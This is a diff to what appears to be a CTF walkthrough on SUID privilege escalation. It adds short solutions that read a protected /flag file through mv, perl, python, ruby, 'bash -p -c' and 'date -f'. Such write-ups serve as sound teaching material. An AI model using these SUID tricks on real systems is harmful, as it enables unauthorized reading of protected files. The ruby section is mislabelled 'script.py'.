@@ -411,7 +411,77 @@ cat /tmp/flagCopy
 
 `mv` command is basically cut operation. We use this command to cut a file or folder and change the original location of the file. We can also use it to rename a file.
 
-```bash
+This is a tricky challenge. So, here's a **PRO TIP: Remember that your home directory is consistent i.e. stores files or directories even after restarting the instance.** Restart this challenge in **Priviledge Mode** and read the flag file. 
 
+```bash
+mv /flag ~/flagCopy
 ```
+
+
+## 41. `perl`
+
+Below is the `perl` program to read a file. Remember to keep the extension in `.pl`.
+#### script.pl
+
+```perl
+#!/usr/bin/perl
+open(r, "<", "/flag");
+print(<r>);
+close(r);
+```
+
+Give executable permissions to the `perl` script using `chmod +x script.pl` and then run the script using `perl script.pl`.
+
+
+## 42. `python`
+
+Reading a file using a `python` program. Remember the extension for `python` programs are `.py`.
+#### script.py
+
+```python
+file=open("/flag", "r")
+content=file.read()
+print(content)
+file.close()
+```
+
+Run the above program using `python script.py` to get the flag content.
+
+
+## 43. `ruby`
+
+Reading a file using a `ruby` program. Remember the extension for `ruby` programs are `.rb`.
+#### script.py
+
+```ruby
+File.open("/flag", "r") do |file|
+	content=file.read
+	puts content
+end
+```
+
+Run the above `ruby` program using `ruby script.rb`
+
+
+## 44. `bash`
+
+`bash` script if set to SETUID will drop its privileges if we create a script and execute it. The 2 switches come in handy.
+- `-p` -> Prevents dropping of privileges.
+- `-c` -> Executes commands given as string.
+
+```bash
+bash -p -c "cat /flag"
+```
+
+
+## 45. `date`
+
+`date` command is used to display date and time in the current system. We can also use it to manipulate the system's date and time.  We are going to use the `-f` switch to solve this challenge. The `-f` switch tries to interpret each line of text and display its corresponding date based on the line but since its a flag file the data format will be invalid and it will just display the flag contents.
+
+```bash
+date -f /flag
+```
+
+
+## 46. `dmesg`
 
